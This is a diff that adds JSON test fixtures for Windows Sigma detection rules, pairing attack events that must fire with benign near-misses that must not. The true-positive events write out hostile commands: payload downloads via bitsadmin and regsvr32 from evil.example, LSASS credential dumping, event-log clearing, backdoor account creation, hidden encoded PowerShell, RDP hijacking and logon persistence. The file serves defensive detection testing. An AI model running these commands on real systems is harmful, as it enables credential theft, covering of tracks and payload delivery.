@@ -1,0 +1,74 @@
+{
+  "_comment": "WS2.1 detection fixtures. Per rule: one true_positive event that MUST fire, and true_negatives (benign / near-miss) that MUST NOT — the false-positive regression. Keyed by rule filename. Events use Sigma field names (Image/CommandLine) so they test the rule LOGIC independent of the ECS field mapping.",
+
+  "proc_creation_win_bitsadmin_download.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /transfer job http://evil.example/x.exe C:\\x.exe"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /list /allusers"},
+      {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache /transfer http://x/y"}
+    ]
+  },
+  "proc_creation_win_clear_event_logs.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil cl Security"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil qe Security /c:10"},
+      {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c echo clear-log"}
+    ]
+  },
+  "proc_creation_win_local_acct_create.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user backdoor P@ssw0rd /add"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user administrator"},
+      {"Image": "C:\\Windows\\System32\\net1.exe", "CommandLine": "net1 localgroup administrators"}
+    ]
+  },
+  "proc_creation_win_lsass_dump.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\lsass.dmp full"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"},
+      {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe comsvcs.dll, NoSuchExport"}
+    ]
+  },
+  "proc_creation_win_powershell_encoded.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc ZQBjAGgAbwAgAGgAaQA="},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\admin\\backup.ps1"},
+      {"Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh -Command Get-Process"}
+    ]
+  },
+  "proc_creation_win_rdp_hijack_tscon.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\tscon.exe", "CommandLine": "tscon.exe 1 /dest:rdp-tcp#5"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\tscon.exe", "CommandLine": "tscon.exe /?"},
+      {"Image": "C:\\Windows\\System32\\mstsc.exe", "CommandLine": "mstsc.exe /dest:foo"}
+    ]
+  },
+  "proc_creation_win_regsvr32_remote_sct.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s C:\\app\\mylib.dll"},
+      {"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /i:C:\\local\\x.inf setupapi.dll"}
+    ]
+  },
+  "proc_creation_win_scheduled_task.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn EvilTask /tr C:\\m.exe /sc onlogon"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /query /fo LIST"},
+      {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /xml task.xml"}
+    ]
+  },
+  "proc_creation_win_user_discovery.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all"},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami"},
+      {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /user"}
+    ]
+  },
+  "proc_creation_win_wmi_process_create.yml": {
+    "true_positive": {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic process call create \"calc.exe\""},
+    "true_negatives": [
+      {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic process list brief"},
+      {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic os get caption"}
+    ]
+  }
+}
